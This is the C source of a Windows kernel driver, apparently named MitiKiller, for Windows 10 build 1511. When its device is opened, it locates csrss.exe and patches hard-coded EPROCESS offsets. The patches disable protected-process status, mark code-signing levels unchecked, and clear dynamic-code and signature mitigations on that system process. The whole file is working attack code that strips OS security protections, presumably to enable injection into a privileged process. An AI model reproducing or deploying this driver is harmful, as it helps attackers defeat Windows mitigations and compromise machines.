#include "MitiKiller.h"

// This driver works on Windows10 Threshold 2(1511)

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNICODE_STRING SymbolicLinkName, DeviceName;
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS Status;

	UNREFERENCED_PARAMETER(RegistryPath);

	RtlInitUnicodeString(&SymbolicLinkName, L"\\??\\MitiLinker");
	RtlInitUnicodeString(&DeviceName, L"\\Device\\MitiDevice");

	Status = IoCreateDevice(DriverObject,
							0,
							&DeviceName,
							FILE_DEVICE_UNKNOWN,
							FILE_DEVICE_SECURE_OPEN,
							0,
							&DeviceObject);
	if (Status) {
		DbgPrint("IoCreateDevice failed.. Reason : %d\n", Status);
		return Status;
	}
	Status = IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);
	if (Status) {
		DbgPrint("IoCreateDevice failed.. Reason : %d\n", Status);
		return Status;
	}
	DriverObject->MajorFunction[IRP_MJ_CREATE] = create_dispatch;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = device_control_dispatch;

	return STATUS_SUCCESS;
}

NTSTATUS create_dispatch(PDEVICE_OBJECT DeviceObject, PIRP irp) {
	NTSTATUS Status = STATUS_SUCCESS;
	MyZwQuerySystemInformation fpZwQuerySystemInformation;
	PSYSTEM_PROCESS_INFORMATION pspi;
	UNICODE_STRING NameOfFunction, TargetName;
	ULONG ReturnLength = 0;
	PVOID SizeFinder = NULL64;
	PVOID TargetPID = 0;
	PEPROCESS TargetEPROCESS;
	PEPROCESS_FLAGS TargetFlags;
	PEPROCESS_FLAGS2 TargetFlags2;
	PEPROCESS_FLAGS3 TargetFlags3;
	char checker = 0;

	UNREFERENCED_PARAMETER(irp);
	UNREFERENCED_PARAMETER(DeviceObject);

	RtlInitUnicodeString(&NameOfFunction, L"ZwQuerySystemInformation");
	RtlInitUnicodeString(&TargetName, L"csrss.exe");
	DbgPrint("[DBG] CreateDispatch called :D \n");

	fpZwQuerySystemInformation = (MyZwQuerySystemInformation)MmGetSystemRoutineAddress(&NameOfFunction);
	DbgPrint("[DBG] fpZwQuerySystemInformation = %I64X :D\n", fpZwQuerySystemInformation);
	do {
		if (checker) {
			ExFreePool(SizeFinder);
		}
		checker = 1;
		SizeFinder = ExAllocatePool(NonPagedPool, ReturnLength);
	} while (fpZwQuerySystemInformation(SystemProcessInformation, SizeFinder, ReturnLength, &ReturnLength));
	DbgPrint("[DBG] ReturnLength : %d :D\n", ReturnLength);
	pspi = (PSYSTEM_PROCESS_INFORMATION)SizeFinder;

	while (pspi->NextEntryOffset) {
		if (!RtlCompareUnicodeString(&(pspi->ImageName), &TargetName, TRUE))
		{
			if ((pspi->SessionId) == 1) {
				TargetPID = pspi->UniqueProcessId;
				DbgPrint("[DBG] Got cha! :D\n");
				break;
			}
		}
		pspi = (PSYSTEM_PROCESS_INFORMATION)((char*)pspi + pspi->NextEntryOffset); // next struct
	}
	if (!TargetPID) DbgPrint("[DBG] Meh -_- Can't find target prcoess.. work harder :D\n");
	PsLookupProcessByProcessId((HANDLE)TargetPID, &TargetEPROCESS);
	*(UCHAR*)((UCHAR*)TargetEPROCESS + 0x6b0) = SE_SIGNING_LEVEL_UNCHECKED; // SignatureLevel 
	*(UCHAR*)((UCHAR*)TargetEPROCESS + 0x6b1) = SE_SIGNING_LEVEL_UNCHECKED; // SectionSignatureLevel
	*(UCHAR*)((UCHAR*)TargetEPROCESS + 0x6b2) = 0; // PPL Disable
	TargetFlags = (EPROCESS_FLAGS*)((UCHAR*)(TargetEPROCESS)+0x304);
	TargetFlags2 = (EPROCESS_FLAGS2*)((UCHAR*)(TargetEPROCESS)+0x300);
	TargetFlags3 = (EPROCESS_FLAGS3*)((UCHAR*)(TargetEPROCESS)+0x6b4);
	TargetFlags2->DisableDynamicCode = 0;
	TargetFlags3->SignatureMitigationOptIn = 0;	
	ExFreePool(SizeFinder); // last free
	return Status;
}
NTSTATUS device_control_dispatch(PDEVICE_OBJECT DeviceObject, PIRP irp) {
	NTSTATUS Status = STATUS_SUCCESS;
	UNREFERENCED_PARAMETER(DeviceObject);
	UNREFERENCED_PARAMETER(irp);
	return Status;
}